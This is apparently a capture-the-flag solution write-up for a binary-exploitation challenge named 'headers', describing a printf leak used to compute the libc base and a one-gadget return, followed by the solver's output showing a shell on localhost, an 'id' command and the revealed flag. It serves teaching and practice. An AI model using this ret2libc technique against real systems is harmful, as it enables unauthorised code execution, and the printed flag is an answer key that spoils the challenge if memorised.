# Solution

This binary is a little bit trickier since call to system is not made explicitly as in the previous binary. The `printf` leak is made by the binary to make things easier for the players.

This leak can then be leveraged to recalculate the offset of the libc address and the easiest approach is to leverage a one gadget in libc. The `mov eax, 0; pop rbp; ret` gadget is used to respect the condition of the one gadget in order for it to be called.

Solution is in `headers-solution.py`.

```sh
$ python3 headers-solution.py 
[*] '/home/vm/Documents/pwn-solutions/headers'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/vm/Documents/pwn-solutions/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to localhost on port 9000: Done
[*] Leaked printf: 0x7f13b9173810
[*] libc address: 0x7f13b911e000
[*] one gadget: 0x7f13b9163226
[*] Switching to interactive mode
$ $ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ $ cat flag.txt
ibctf{scanf-1zz-an-4ctu4l_wr1t3}
```
